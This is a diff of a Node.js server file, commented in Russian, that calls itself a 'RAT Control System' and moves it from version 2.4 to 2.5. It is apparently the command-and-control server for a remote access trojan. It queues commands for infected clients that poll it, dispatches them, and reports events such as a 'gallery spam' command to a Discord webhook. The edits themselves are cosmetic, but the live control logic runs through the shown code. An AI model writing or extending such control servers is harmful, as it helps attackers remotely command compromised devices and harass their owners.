@@ -1,4 +1,3 @@
-// server.js
 const http = require('http');
 const fetch = require('node-fetch');
 
@@ -16,7 +15,7 @@ async function sendDiscordMessage(title, description, color = 0x3498db, fields =
         fields: fields,
         timestamp: new Date().toISOString(),
         footer: {
-            text: "RAT Control System v2.4"
+            text: "RAT Control System v2.5"
         }
     };
 
@@ -90,7 +89,7 @@ const server = http.createServer((req, res) => {
                 } else if (command === "gallery_spam_start") {
                     await sendDiscordMessage(
                         "🖼️ Gallery Spam запущен",
-                        `**Количество копий:** ${args[0]}\n**Файл:** ${args[1]}`,
+                        `**Количество файлов:** ${args[0]}\n**Источник:** GitHub`,
                         0x74b9ff
                     );
                 } else if (command === "spam_completed") {
@@ -103,7 +102,7 @@ const server = http.createServer((req, res) => {
 
                 res.end(JSON.stringify({ 
                     status: "OK",
-                    message: `Команда ${command} принята для всех клиентов`
+                    message: `Команда ${command} принята`
                 }));
             } catch (e) {
                 console.error('Ошибка обработки команды:', e);
@@ -118,12 +117,11 @@ const server = http.createServer((req, res) => {
         console.log(`📡 Клиент запрашивает команды (в очереди: ${commandQueue.length})`);
         
         if (commandQueue.length > 0) {
-            const commands = [...commandQueue]; // Отправляем ВСЕ команды
-            commandQueue = []; // Очищаем очередь после отправки
+            const commands = [...commandQueue];
+            commandQueue = [];
             
             console.log(`📤 Отправка ${commands.length} команд клиенту`);
             
-            // Если команд несколько, отправляем первую (клиент будет запрашивать следующие)
             const nextCommand = commands[0];
             
             res.end(JSON.stringify({
@@ -132,7 +130,6 @@ const server = http.createServer((req, res) => {
                 timestamp: nextCommand.timestamp
             }));
         } else {
-            // Нет команд
             res.end(JSON.stringify({
                 command: "",
                 args: []
@@ -224,7 +221,7 @@ const server = http.createServer((req, res) => {
     if (req.method === 'GET' && req.url === '/status') {
         res.end(JSON.stringify({
             status: "online",
-            version: "2.4.0",
+            version: "2.5.0",
             timestamp: new Date().toISOString(),
             pending_commands: commandQueue.length
         }));
@@ -237,7 +234,7 @@ const server = http.createServer((req, res) => {
 
 server.listen(process.env.PORT || 3000, () => {
     console.log("🚀 Сервер запущен на порту 3000");
-    console.log("📊 Версия: 2.4.0");
+    console.log("📊 Версия: 2.5.0");
     console.log("🔗 Webhook: " + WEBHOOK_URL);
-    console.log("✅ Готов к приему команд для всех клиентов");
+    console.log("✅ Готов к приему команд");
 });
